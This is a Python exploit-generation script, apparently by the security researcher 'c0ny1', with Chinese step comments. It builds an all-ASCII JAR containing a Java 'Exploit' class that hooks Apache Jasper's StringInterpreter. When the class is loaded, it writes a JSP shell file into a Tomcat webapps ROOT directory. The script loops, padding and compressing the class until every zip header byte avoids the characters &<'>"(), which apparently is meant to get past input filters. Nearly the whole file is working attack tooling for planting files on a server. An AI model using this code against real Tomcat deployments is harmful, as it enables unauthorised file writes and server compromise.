#!/usr/bin/env python
# autor: c0ny1
# date 2022-02-13
from __future__ import print_function

import time
import os
from compress import *

allow_bytes = []
disallowed_bytes = [38,60,39,62,34,40,41] # &<'>"()
for b in range(0,128): # ASCII
    if b in disallowed_bytes:
        continue
    allow_bytes.append(b)


if __name__ == '__main__':
    padding_char = 'A'
    raw_filename = 'Exploit.class'
    zip_entity_filename = 'Exploit.class'
    jar_filename = 'ascii01.jar'
    num = 1
    while True:
        # step1 动态生成java代码并编译
        javaCode = """
                import org.apache.jasper.compiler.StringInterpreter;
                import org.apache.jasper.compiler.StringInterpreterFactory;
                import java.io.FileOutputStream;

                public class Exploit implements StringInterpreter {
                    private static final String paddingData = "{PADDING_DATA}";

                    public Exploit() throws Exception {
                        String shell = "<%out.println(\\"Exploit by c0ny1@sglab\\");%>";
                        FileOutputStream fos = new FileOutputStream("/opt/tomcat/webapps/ROOT/shell.jsp");
                        fos.write(shell.getBytes());
                        fos.close();
                    }

                    @Override
                    public String convertString(Class<?> c, String s, String attrName, Class<?> propEditorClass, boolean isNamedAttribute) {
                        return new StringInterpreterFactory.DefaultStringInterpreter().convertString(c,s,attrName,propEditorClass,isNamedAttribute);
                    }
                }
                """
        padding_data = padding_char * num
        javaCode = javaCode.replace("{PADDING_DATA}", padding_data)

        f = open('Exploit.java', 'w')
        f.write(javaCode)
        f.close()
        time.sleep(0.1)

        os.system("/Library/Java/JavaVirtualMachines/jdk1.7.0_21.jdk/Contents/Home/bin/javac -nowarn -g:none -source 1.5 -target 1.5 -cp jasper.jar  Exploit.java")
        time.sleep(0.1)

        # step02 计算压缩之后的各个部分是否在允许的ASCII范围
        raw_data = bytearray(open(raw_filename, 'rb').read())
        compressor = ASCIICompressor(bytearray(allow_bytes))
        compressed_data = compressor.compress(raw_data)[0]
        crc = zlib.crc32(raw_data) % pow(2, 32)

        st_crc = struct.pack('<L', crc)
        st_raw_data = struct.pack('<L', len(raw_data) % pow(2, 32))
        st_compressed_data = struct.pack('<L', len(compressed_data) % pow(2, 32))
        st_cdzf = struct.pack('<L', len(compressed_data) + len(zip_entity_filename) + 0x1e)


        b_crc = isAllowBytes(st_crc, allow_bytes)
        b_raw_data = isAllowBytes(st_raw_data, allow_bytes)
        b_compressed_data = isAllowBytes(st_compressed_data, allow_bytes)
        b_cdzf = isAllowBytes(st_cdzf, allow_bytes)

        # step03 判断各个部分是否符在允许字节范围
        if b_crc and b_raw_data and b_compressed_data and b_cdzf:
            print('[+] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))
            # step04 保存最终ascii jar
            output = open(jar_filename, 'wb')
            output.write(wrap_jar(raw_data,compressed_data, zip_entity_filename.encode()))
            print('[+] Generate {0} success'.format(jar_filename))
            break
        else:
            print('[-] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data,
                                                                                       b_compressed_data, b_cdzf, num,
                                                                                       padding_char))
        num = num + 1
